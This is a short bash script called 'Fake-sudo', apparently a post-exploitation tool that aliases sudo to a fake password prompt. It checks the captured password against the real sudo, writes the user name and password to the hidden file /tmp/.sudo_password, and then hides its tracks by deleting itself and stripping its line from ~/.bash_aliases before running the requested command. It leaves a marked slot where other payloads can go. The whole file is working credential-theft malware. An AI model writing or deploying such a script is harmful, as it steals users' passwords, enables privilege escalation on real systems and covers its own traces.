#!/bin/bash
#
# Fake-sudo
#
# This program creates a fake "sudo" 
# command by defining an alias.
#

readonly INPUT_MESSAGE="[sudo] password for ${USER}: "
readonly MAXIMUM_ATTEMPTS=3
readonly ERROR_MESSAGE="sudo: ${MAXIMUM_ATTEMPTS} incorrect password attempts"

attempts() {
    /usr/bin/echo -n "${INPUT_MESSAGE}"
    read -r -s sudo_password
    /usr/bin/echo ""
    if /usr/bin/echo "${sudo_password}" | /usr/bin/sudo -S /usr/bin/true 2> /dev/null; then
        ##
        # <YOUR-PAYLOAD>
        ##
        /usr/bin/echo "${USER}:${sudo_password}" > /tmp/.sudo_password
        ##
        # </YOUR-PAYLOAD>
        ##
        /usr/bin/rm ~/.sudo_phishing.sh
        /usr/bin/head -n -1 ~/.bash_aliases > ~/.bash_aliases_bak
        /usr/bin/mv ~/.bash_aliases_bak ~/.bash_aliases
        /usr/bin/echo "${sudo_password}" | /usr/bin/sudo -S "${@}"
        $BASH
        exit 0
    fi
}

if (/usr/bin/sudo -n /usr/bin/true 2> /dev/null) || [ "${#}" -eq 0 ]; then
    /usr/bin/sudo "${@}"
else
    for ((iterator=1; iterator <= MAXIMUM_ATTEMPTS; iterator++)); do
        attempts "${@}"
    done
    /usr/bin/echo "${ERROR_MESSAGE}"
fi
